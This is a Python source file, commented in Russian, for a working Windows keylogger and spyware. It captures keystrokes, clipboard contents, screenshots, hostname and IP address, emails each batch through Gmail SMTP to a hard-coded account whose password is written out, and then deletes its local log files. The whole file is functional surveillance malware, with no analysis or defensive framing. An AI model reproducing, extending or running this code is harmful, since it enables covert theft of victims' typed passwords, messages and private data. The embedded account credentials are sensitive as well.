# библиотеки
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
import pyscreenshot as ImageGrab
from pynput.keyboard import Key, Listener
import time
import os

# Запуск экземпляров файлов и путей
system_information = "system.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"
extend = "\\"
file_path = "C:\\Users\\Pidge\\PycharmProjects\\pythonProject12"

# Контроль времени
time_iteration = 15 # 7200 # 2 hours
number_of_iterations_end = 2 # 5000


# Контроль почты
email_address = "pipipupu1488chek@gmail.com"
password = "qwertypoi217"


#######################################################

# Отправка на  почту
def send_email(filename, attachment):

    fromaddr = email_address
    toaddr = email_address

    # экземпляр  MIMEMultipart
    msg = MIMEMultipart()
    # сохранение адреса электронной почты отправителя
    msg['From'] = fromaddr
    # сохранение адреса электронной почты получателя
    msg['To'] = toaddr
    # сохраниене предмета
    msg['Subject'] = "Log File"

    # строка для хранения mail
    body = "Body_of_the_mail"

    # прикрепить body к экземпляром msg
    msg.attach(MIMEText(body, 'plain'))

    # откройте файл для отправки
    filename = filename
    attachment = open(attachment, "rb")

    # экземпляр MIMEBase и назван как p
    p = MIMEBase('application', 'octet-stream')

    # Преобразование payload в закодированную форму
    p.set_payload((attachment).read())

    # кодировать в base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # прикрепить экземпляр p к экземпляру msg
    msg.attach(p)

    # Создание  SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)
    # Запуск TLS для безопасности
    s.starttls()
    # Аутентификация
    s.login(fromaddr, password)
    # Преобразовывает Multipart msg в строку
    text = msg.as_string()

    # Отправка почты
    s.sendmail(fromaddr, toaddr, text)
    # Завершение сеанса
    s.quit()

# Получение информации компьютера и сети, в которйо он находится
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        f.write("Processor: " + (platform.processor() + "\n"))
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("IP Address: " + IPAddr + "\n")

computer_information()
send_email(system_information, file_path + extend + system_information)

# Соберирание содержимого буфера обмена
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied.")

# Функция по созданию скриншота экрана
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

# Контроль времени для кейлоггера
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration


while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []
    counter = 0

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        # Отправление содержимого  кейлоггера на электронную почту
        send_email(keys_information, file_path + extend + keys_information)
        # Очистка содержимого файла журнала кейлоггера.
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
        # Отправка скриншота на почту
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information)
        # Взятие содержимого буфера обмена и отправление на электронную почту
        copy_clipboard()
        send_email(clipboard_information, file_path + extend + clipboard_information)


        number_of_iterations += 1
        # Обновить текущее время
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration



time.sleep(120) # Sleep две минуты, прежде чем удалятся все файлы

# Удалить файлы
delete_files = [system_information, clipboard_information, screenshot_information, keys_information]
for file in delete_files:
    os.remove(file_path + extend + file)